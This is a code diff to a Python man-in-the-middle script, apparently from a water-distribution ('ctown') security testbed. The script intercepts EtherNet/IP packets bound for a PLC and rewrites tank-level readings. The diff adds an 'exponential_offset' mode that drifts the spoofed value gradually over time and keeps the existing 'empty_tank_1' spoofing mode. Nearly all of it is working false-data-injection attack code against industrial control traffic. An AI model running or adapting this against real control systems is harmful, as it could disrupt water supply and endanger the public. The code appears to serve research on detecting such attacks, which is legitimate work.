@@ -8,6 +8,7 @@ import sys
 import os
 import time
 import shlex
+import numpy as np
 
 from ips import PLC_IPS
 
@@ -44,6 +45,19 @@ def spoof_value(raw):
     pay = translate_float_to_load(fake_value, raw[0], raw[1])
     return pay
 
+def exponential_spoof(raw):
+    print ("Spoofing-----------")
+    k = 5
+    t = 50
+    float_value = translate_load_to_float(raw)
+
+    fake_value = float_value + k*(1-np.exp(-spoof_attack_counter/t))
+
+    c.execute("UPDATE ctown SET value = 3 WHERE name = 'ATT_1'")
+    conn.commit()
+    pay = translate_float_to_load(fake_value, raw[0], raw[1])
+    return pay
+
 def capture(packet):
     print("Packet...")
     pkt = IP(packet.get_payload())
@@ -51,22 +65,44 @@ def capture(packet):
         print("Capturing...")
         raw = pkt[Raw].load  # This is a string with the "RAW" part of the packet (CIP payload)
 
-        if sys.argv[1] == '192.168.1.1':
-            pay = spoof_value(raw)
-            pkt[Raw].load = pay  # Replace the tank level with the spoofed one
-            del pkt[TCP].chksum  # Needed to recalculate the checksum
-            packet.set_payload(str(pkt))
+        if sys.argv[2] == "empty_tank_1":
+            if sys.argv[1] == '192.168.1.1':
+                pay = spoof_value(raw)
+                pkt[Raw].load = pay  # Replace the tank level with the spoofed one
+                del pkt[TCP].chksum  # Needed to recalculate the checksum
+                packet.set_payload(str(pkt))
 
-            rows = c.execute("SELECT value FROM ctown WHERE name = 'ATT_2'").fetchall()
-            conn.commit()
-            attack_on = int(rows[0][0])
+                rows = c.execute("SELECT value FROM ctown WHERE name = 'ATT_2'").fetchall()
+                conn.commit()
+                attack_on = int(rows[0][0])
 
-            if attack_on == 0:
-                print("Attack finished")
-                global spoof_phase
-                spoof_phase = 0
-                __setdown(enip_port)
-                return 0
+                if attack_on == 0:
+                    print("Attack finished")
+                    global spoof_phase
+                    spoof_phase = 0
+                    __setdown(enip_port)
+                    return 0
+
+        if sys.argv[2] == "exponential_offset":
+            if sys.argv[1] == '192.168.1.1':
+                pay = exponential_spoof(raw)
+                pkt[Raw].load = pay  # Replace the tank level with the spoofed one
+                del pkt[TCP].chksum  # Needed to recalculate the checksum
+                packet.set_payload(str(pkt))
+                rows = c.execute("SELECT value FROM ctown WHERE name = 'ATT_2'").fetchall()
+                conn.commit()
+                attack_on = int(rows[0][0])
+
+                if attack_on == 0:
+                    print("Attack finished")
+                    global spoof_phase
+                    spoof_phase = 0
+                    __setdown(enip_port)
+                    return 0
+
+                global spoof_attack_counter
+                spoof_attack_counter += 1
+
     packet.accept()
 
 
